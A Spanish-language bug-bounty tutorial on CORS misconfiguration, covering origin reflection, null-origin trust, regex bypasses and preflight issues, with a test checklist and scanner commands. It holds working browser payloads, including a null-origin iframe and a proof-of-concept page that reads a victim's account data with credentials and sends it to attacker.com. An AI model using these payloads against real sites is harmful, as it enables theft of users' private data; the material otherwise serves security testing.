---
title: "CORS Misconfiguration"
description: "CORS (Cross-Origin Resource Sharing) es el mecanismo del navegador que relaja la Same-Origin Policy."
category: "Web"
date: 2026-07-18
---
# 🌍 CORS Misconfiguration

CORS (Cross-Origin Resource Sharing) es el mecanismo del navegador que relaja la Same-Origin Policy. Una mala configuración permite que un sitio atacante **lea datos sensibles** de otro sitio.

**Estadística 2026:** CORS misconfiguration es el hallazgo #1 en bug bounty — 23% de todos los reportes aceptados.

---

## El problema central

Un servidor toma el header `Origin` que envía el navegador y lo refleja sin validación:

```http
GET /api/user HTTP/1.1
Origin: https://attacker.com
Cookie: session=abc123

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

{"email": "victim@example.com", "balance": 4200}
```

La combinación **`Access-Control-Allow-Origin: <attacker>` + `Allow-Credentials: true`** es la puerta abierta.

---

## Patrones de misconfiguración

### 1. Origin Reflection (el más común)
El servidor devuelve cualquier Origin:

```http
Origin: https://evil.com
→ Access-Control-Allow-Origin: https://evil.com
```

### 2. Wildcard con credenciales
`Access-Control-Allow-Origin: *` + `Allow-Credentials: true` → el navegador bloquea, pero algunos servidores lo envían mal.

### 3. Null Origin trust
Si el servidor acepta `null` como origin, explota con sandboxed iframe:

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://target.com/api/user', {credentials:'include'})
      .then(r => r.json()).then(d => parent.postMessage(d, '*'))
  </script>
"></iframe>
```

### 4. Regex bypass
Validación de origen con regex rota:

```
https://trusted.com   →  https://trusted.com.evil.com  ✅ (regex: *.trusted.com)
https://trusted.com   →  https://trusted.comevil.com    ✅ (regex sin punto)
https://trusted.com   →  https://trusted.com.mx         ✅ (tld confusion)
```

### 5. Subdomain trust
Si `*.target.com` está permitido y hay XSS en cualquier subdominio → full exfiltración.

### 6. Preflight bypass (OPTIONS)
```http
OPTIONS /api/sensitive HTTP/1.1
Origin: https://evil.com

→ ACAO: *
→ ACAM: GET, POST, PUT, DELETE
→ ACAH: Authorization
```

Si el `OPTIONS` no requiere auth, revela el surface completo.

---

## Explotación (PoC HTML)

```html
<html>
<body>
<script>
  const xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/api/userinfo', true);
  xhr.withCredentials = true;
  xhr.onload = function() {
    fetch('https://attacker.com/collect?data=' + btoa(xhr.responseText));
  };
  xhr.send();
</script>
</body>
</html>
```

---

## Dónde probar

- Endpoints que devuelven PII, auth tokens, datos de cuenta
- APIs con `Authorization: Bearer` (si usan cookies también, double check)
- Subdominios que no esperarías que tengan CORS
- CDNs frontales (Cloudflare, Akamai) vs origin

---

## Herramientas

```bash
# Corsy
python3 corsy.py -u https://target.com

# CORScanner
python3 corscanner.py -i alive.txt

# Nuclei
nuclei -l alive.txt -t ~/nuclei-templates/misconfiguration/cors/

# Burp: enviar Origin: https://evil.com manualmente
# Extensión: CORSPloit
```

---

## Checklist de prueba

- [ ] Probar Origin arbitrario
- [ ] Probar Origin: null
- [ ] Probar subdominio: `https://evil.target.com`
- [ ] Probar regex bypass: `https://target.com.evil.com`
- [ ] Probar `Vary: Origin` en responses
- [ ] Probar preflight OPTIONS sin auth
- [ ] Probar subdominios confiables enumerados

---

## Relacionado
- **Autenticacion Web** — CORS + token theft → ATO
- **CSRF moderno** — preflight bypass, Origin reflection
- **Host Header Injection** — Origin validation basado en Host
- **SSRF** — CORS bypass via internal origin reflection
- **Subdomain Takeover y Recon Web** — subdominio confiable comprometido
- **WebSocket Security** — CORS validation en handshake WS
- **Claude-BugHunter** (skill `hunt-cors`)
